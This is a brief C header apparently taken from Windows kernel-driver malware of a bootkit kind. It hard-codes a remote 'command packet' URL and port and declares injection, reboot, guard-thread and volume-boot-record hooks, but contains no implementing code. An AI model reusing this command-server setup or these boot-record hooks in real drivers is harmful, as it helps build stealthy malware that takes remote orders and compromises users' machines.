#ifndef __DRV_FILE_SYSTEM_H__
#define __DRV_FILE_SYSTEM_H__

#define CONNECT_COMMAND_PACKET_URL		"http://www.bioskit.com"
#define CONNECT_COMMAND_PACKET_PORT		4040

void CheckFileSystem(PDRIVER_OBJECT pDriverObject);
//NTSTATUS DoWork(PINJECT_RELEVANT_OFFSET pInjectRelevantOffset);
VOID SystemReboot();

extern BOOLEAN g_bExitGuardThread;
extern BOOLEAN g_bUninstalled;
extern PCHAR g_pVbr;

#endif